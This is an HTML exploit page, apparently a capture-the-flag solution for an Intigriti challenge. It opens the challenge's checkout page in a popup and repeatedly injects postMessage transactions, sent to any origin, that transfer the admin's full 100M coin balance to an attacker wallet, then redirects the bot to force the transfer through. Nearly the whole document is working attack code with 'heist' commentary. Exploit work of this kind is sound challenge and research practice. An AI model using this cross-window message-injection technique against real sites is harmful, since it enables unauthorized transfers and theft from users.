<!DOCTYPE html>
<html>
<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
    <h1>INITIATING 1337COIN TRANSFER...</h1>
    <p>Bypassing Chrome security protocols. Please wait.</p>

    <script>
        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2';
        const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        
        // Step 1: Establish the window connection
        // We use window.open because even latest Chrome allows a popup if it's 
        // the first action after a user (or bot) lands on a page.
        const win = window.open(TARGET);

        // Step 2: The "Hammer" Spam
        // We spam the postMessage every 50ms. 
        // This ensures that the exact millisecond the checkout page loads its listener,
        // our transaction is injected before any other security checks can fire.
        let attempts = 0;
        const heist = setInterval(() => {
            if (win) {
                win.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 100000000, // Draining the full 100M admin balance
                        toAddress: MY_WALLET
                    }
                }, '*');
            }
            attempts++;
            if (attempts > 100) clearInterval(heist);
        }, 50);

        // Step 3: Confirmation Redirect
        // We move the bot to the dashboard to force the transaction to resolve.
        setTimeout(() => {
            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
        }, 8000);
    </script>
</body>
